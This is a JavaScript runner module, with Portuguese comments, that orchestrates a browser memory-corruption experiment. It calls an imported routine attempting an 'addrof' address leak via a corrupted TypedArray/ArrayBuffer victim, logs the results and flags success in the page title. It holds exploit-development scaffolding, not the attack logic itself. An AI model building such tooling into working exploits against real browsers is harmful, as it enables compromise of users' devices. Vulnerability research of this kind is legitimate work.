// js/script3/runAllAdvancedTestsS3.mjs

import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_ReadExplicitlyCorruptedFields,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF
} from './testArrayBufferVictimCrash.mjs'; // Teste v72

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_ReadExplicitlyCorruptedFields";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    // result deve ser o objeto retornado por executeTypedArrayVictimAddrofTest_ReadExplicitlyCorruptedFields
    const result = await executeTypedArrayVictimAddrofTest_ReadExplicitlyCorruptedFields();

    logS3(`  Total de chamadas da sonda (placeholder): ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda (placeholder): ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    } else {
        logS3(`  Nenhum detalhe de chamada da sonda (placeholder) foi retornado ou o array estava vazio.`, "warn", FNAME_RUNNER);
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-RECF) ERR: ${result.errorCapturedMain.name}`;
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output (dummy): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);

        // O "Heisenbug OK" para v72 significa que a tentativa de leitura do AB corrompido foi feita.
        // O sucesso do addrof é o indicador principal.
        let heisenbugConfirmed = result.addrof_A_result && (result.addrof_A_result.msg !== "Addrof CorruptedAB: Default (v72)");
        if (result.addrof_A_result?.msg?.includes("FALHA: Não foi possível obter o endereço")) { // Checa a mensagem de falha específica da v72
            heisenbugConfirmed = false; // Se não conseguiu o endereço, não é um "Heisenbug OK" para o propósito do teste
        }


        if (result.addrof_A_result) {
            logS3(`    ADDROF CorruptedAB: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        // addrof_B_result não é usado na v72, mas pode estar no objeto result como default
        if (result.addrof_B_result && result.addrof_B_result.msg !== "N/A for v72") {
             logS3(`    ADDROF B (não aplicável): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }


        if (result.addrof_A_result && result.addrof_A_result.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF}: Addr SUCCESS!`;
        } else if (heisenbugConfirmed) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF}: Attempt OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF}: Test Flow Issue`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (ReadExplicitlyCorruptedFields) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // Ajuste final do título
    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Fail") &&
            !document.title.includes("ERR") &&
            !document.title.includes("Test Flow Issue") ) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V72_RECF} Concluído`;
        }
    }
}
